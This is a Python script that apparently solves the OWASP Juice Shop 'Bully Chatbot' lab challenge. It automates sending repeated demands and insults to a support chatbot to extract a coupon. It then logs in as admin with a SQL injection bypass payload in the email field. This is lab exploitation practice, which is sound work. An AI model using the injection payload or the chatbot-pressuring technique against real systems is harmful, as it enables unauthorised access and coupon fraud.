#!/usr/bin/env python3
"""
Bully Chatbot Challenge - Get Coupon Code
The challenge is to receive a coupon from the chatbot by asking for it repeatedly
"""

from playwright.sync_api import sync_playwright
import time
import requests

TARGET = "http://66.42.93.220:3000"

def solve_chatbot_coupon():
    """Get a coupon code from the chatbot"""
    
    print("🤖 BULLY CHATBOT (Get Coupon) CHALLENGE")
    print("=" * 60)
    print("📝 Goal: Receive a coupon code from the support chatbot")
    print("=" * 60)
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)  # Show browser for debugging
        page = browser.new_page()
        
        print("🌐 Opening Juice Shop...")
        page.goto(TARGET, wait_until="networkidle", timeout=30000)
        time.sleep(3)
        
        # Look for the support chat button (usually bottom right)
        print("🔍 Looking for support chat button...")
        
        # Click on the chat bubble/button
        try:
            # Common selectors for chat buttons
            chat_selectors = [
                'button mat-icon:has-text("chat")',
                'button mat-icon:has-text("contact_support")',
                'button[aria-label*="support" i]',
                '.chat-button',
                'button:has-text("Support")',
                'mat-icon:has-text("chat_bubble")',
                'button[mattooltip*="support" i]',
                'button[mattooltip*="chat" i]'
            ]
            
            for selector in chat_selectors:
                try:
                    chat_btn = page.locator(selector).first
                    if chat_btn.is_visible():
                        print(f"   Found chat button: {selector}")
                        chat_btn.click()
                        time.sleep(2)
                        break
                except:
                    continue
        except:
            print("   Could not find chat button")
        
        # Wait for chat to open
        time.sleep(2)
        
        # Find the chat input
        print("\n💬 Finding chat input...")
        chat_input = None
        
        input_selectors = [
            'input[placeholder*="message" i]',
            'input[placeholder*="ask" i]',
            'input[placeholder*="type" i]',
            'textarea',
            '#message-input',
            '.chat-input'
        ]
        
        for selector in input_selectors:
            try:
                input_field = page.locator(selector).last
                if input_field.is_visible():
                    chat_input = input_field
                    print(f"   Found input: {selector}")
                    break
            except:
                continue
        
        if chat_input:
            print("\n🎯 Asking for coupon code...")
            
            # Messages to get a coupon
            messages = [
                "coupon",
                "give me a coupon",
                "I want a coupon",
                "discount",
                "can I have a discount code",
                "coupon please",
                "I need a coupon code",
                "send me a coupon"
            ]
            
            for msg in messages:
                try:
                    print(f"   Sending: '{msg}'")
                    chat_input.click()
                    chat_input.fill(msg)
                    chat_input.press("Enter")
                    time.sleep(2)
                    
                    # Check for coupon in response
                    try:
                        # Look for typical coupon patterns
                        page_text = page.content()
                        import re
                        coupon_patterns = [
                            r'[A-Z0-9]{5,20}',  # Uppercase codes
                            r'\b[A-Z]{3,}\d{2,}\b',  # Like JAN20
                            r'coupon.*?([A-Z0-9-]+)',  # Coupon followed by code
                        ]
                        
                        for pattern in coupon_patterns:
                            matches = re.findall(pattern, page_text)
                            if matches:
                                print(f"   🎯 Possible coupon found: {matches[0]}")
                                
                except Exception as e:
                    print(f"   Error: {e}")
            
            # Also try being mean to get the coupon
            print("\n😈 Trying mean messages...")
            mean_msgs = ["stupid bot", "you're useless", "terrible service"]
            
            for msg in mean_msgs:
                try:
                    print(f"   Sending: '{msg}'")
                    chat_input.click()
                    chat_input.fill(msg)
                    chat_input.press("Enter")
                    time.sleep(2)
                except:
                    pass
        
        # Take screenshot
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/chatbot_coupon.png")
        print("\n📸 Screenshot saved")
        
        time.sleep(5)
        browser.close()
    
    # Check if solved
    print("\n📊 Checking challenge status...")
    session = requests.Session()
    login = session.post(f"{TARGET}/rest/user/login", 
                        json={"email": "admin@juice-sh.op'--", "password": "x"})
    if login.status_code == 200:
        session.headers['Authorization'] = f'Bearer {login.json()["authentication"]["token"]}'
    
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        bully = next((c for c in challenges if 'Bully' in c.get('name', '')), None)
        
        if bully and bully.get('solved', False):
            print(f"\n✅ SUCCESS! {bully['name']} is SOLVED!")
            return True
    
    print("\n⚠️ Challenge not solved yet")
    print("💡 The chatbot may need specific interactions to give a coupon")
    print("📊 Check: http://66.42.93.220:3000/#/score-board")
    return False

if __name__ == "__main__":
    solve_chatbot_coupon()
